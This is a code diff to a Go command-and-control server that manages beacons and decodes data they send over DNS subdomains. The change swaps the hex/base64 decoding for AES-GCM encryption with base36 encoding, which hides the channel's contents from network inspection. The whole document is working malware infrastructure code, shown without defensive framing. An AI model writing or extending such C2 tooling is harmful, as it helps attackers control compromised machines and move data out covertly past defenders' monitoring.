@@ -1,8 +1,6 @@
 package main
 
 import (
-	"encoding/base64"
-	"encoding/hex"
 	"fmt"
 	"log"
 	"strconv"
@@ -63,10 +61,13 @@ type C2Manager struct {
 	mutex           sync.RWMutex
 	taskCounter     int
 	debug           bool
+	aesKey          []byte
 }
 
 // NewC2Manager creates a new C2 management instance
-func NewC2Manager(debug bool) *C2Manager {
+func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
+	aesKey := generateAESKey(encryptionKey)
+
 	return &C2Manager{
 		beacons:         make(map[string]*Beacon),
 		tasks:           make(map[string]*Task),
@@ -74,35 +75,23 @@ func NewC2Manager(debug bool) *C2Manager {
 		expectedResults: make(map[string]*ExpectedResult),
 		taskCounter:     1000,
 		debug:           debug,
+		aesKey:          aesKey,
 	}
 }
 
-// decodeBeaconData decodes base64 or hex encoded data
+// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
 func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
 	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
 	// This handles long subdomains that get split into multiple labels
 	encoded = strings.ReplaceAll(encoded, ".", "")
 
-	// Validate hex string before decoding
-	for _, char := range encoded {
-		if !((char >= '0' && char <= '9') || (char >= 'a' && char <= 'f') || (char >= 'A' && char <= 'F')) {
-			return encoded, fmt.Errorf("invalid hex character: %c", char)
-		}
+	// Use new base36 + AES-GCM decoding
+	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
+	if err != nil {
+		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
 	}
 
-	// Try hex first (case-insensitive, DNS-friendly)
-	if decoded, err := hex.DecodeString(encoded); err == nil {
-		return string(decoded), nil
-	}
-
-	// Try base64 as fallback
-	paddedEncoded := encoded + strings.Repeat("=", (4-len(encoded)%4)%4)
-	if decoded, err := base64.URLEncoding.DecodeString(paddedEncoded); err == nil {
-		return string(decoded), nil
-	}
-
-	// Return as-is if decoding fails
-	return encoded, nil
+	return decoded, nil
 }
 
 // isLegitimateSubdomain checks if a subdomain looks like a legitimate DNS name
